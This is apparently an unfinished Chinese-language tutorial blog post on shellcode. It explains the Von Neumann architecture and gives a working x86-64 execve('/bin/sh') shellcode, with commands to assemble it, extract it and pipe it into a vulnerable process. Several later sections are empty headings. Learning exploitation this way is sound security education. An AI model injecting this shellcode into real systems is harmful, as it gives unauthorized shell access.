---
layout: post
tags: [pwn]
title: "shellcode"
date: 2024-8-8
author: wsxk
comments: true
---

- [1. 介绍: shellcode是什么](#1-介绍-shellcode是什么)
- [2. 编写shellcode](#2-编写shellcode)
- [3. debugging shellcode](#3-debugging-shellcode)
- [4. Forbidden Bytes](#4-forbidden-bytes)
- [5. Common Gotchas](#5-common-gotchas)
- [6. Cross-Architecture shellcode](#6-cross-architecture-shellcode)
- [7. Data Execution Prevention](#7-data-execution-prevention)


## 1. 介绍: shellcode是什么<br>
谈起`shellcode`，就要谈起`冯诺依曼架构(Von Neumann Architecture)和哈佛架构(Harvard Architecture)`了<br>
冯诺依曼架构把代码和数据等同的，而哈佛架构设计上就把代码和数据隔离开来。<br>
当今几乎所有架构，例如`x86, ARM, MIPS, PPC(power pc), SPARC(Scalable Processor Architecture,国际最流行的risc体系架构, etc`，都是冯诺依曼架构。<br>
更多了解[https://zhuanlan.zhihu.com/p/481536761](https://zhuanlan.zhihu.com/p/481536761)<br>
哈佛架构只被用在`AVR, PIC`里（这俩架构都主要用在单片机上）<br>
当冯诺依曼架构中，因为数据和代码是混合在一起的，这就导致了`shellcode`的产生<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240808221010.png)
上图中，因为一个编程失误，导致**用户输入(data)被作为代码(code)执行**。<br>

## 2. 编写shellcode<br>
`shellcode`之所以叫`shellcode`，是因为**利用的目标就是达成任意命令执行**,而一个经典的攻击模式就是启动`shell`:`execve("/bin/sh", NULL, NULL)`<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 59		# this is the syscall number of execve
lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
mov rsi, 0		# this makes the second argument, argv, NULL
mov rdx, 0		# this makes the third argument, envp, NULL
syscall			# this triggers the system call
binsh:				# a label marking where the /bin/sh string is
.string "/bin/sh"
```
在写完`asm`后，介绍一下编译等涉及汇编的命令吧<br>
```
1. Assembling shellcode:
gcc -nostdlib -static shellcode.s -o shellcode-elf

2. Extracting shellcode:
objcopy --dump-section .text=shellcode-raw shellcode-elf

3. Disassembling shellcode:
objdump -M intel -d shellcode-elf

4. Sending shellcode to the stdin of a process (with user input afterwards):
cat shellcode-raw /dev/stdin | /vulnerable_process

5. Strace a program with your shellcode as input:
cat shellcode-raw | strace /vulnerable_process

6. Debug a program with your shellcode as input:
gdb /vulnerable_process
(gdb) r < shellcode-raw
```
这些命令在编写`shellcode`时是非常有用的，下面还有一些好用的工具可供选择！<br>
```
1. pwntools (https://github.com/Gallopsled/pwntools), a library for writing exploits (and shellcode).

2. rappel (https://github.com/yrp604/rappel) lets you explore the effects of instructions.
easily installable via https://github.com/zardus/ctf-tools  

3. amd64 opcode listing: http://ref.x86asm.net/coder64.html 

4. Several gdb plugins exist to make exploit debugging easier!
https://github.com/scwuaptx/Pwngdb
https://github.com/pwndbg/pwndbg
https://github.com/longld/peda 
```

## 3. debugging shellcode<br>
如果想以高层次的信息来debug，可以用:<br>
```
gcc -nostdlib -static shellcode.s -o shellcode.elf
strace ./shellcode.elf
```
来追踪。<br>
如果想要每条汇编的执行，可以用：<br>
```
gdb ./shellcode-elf
```

## 4. Forbidden Bytes<br>

## 5. Common Gotchas<br>

## 6. Cross-Architecture shellcode<br>

## 7. Data Execution Prevention<br>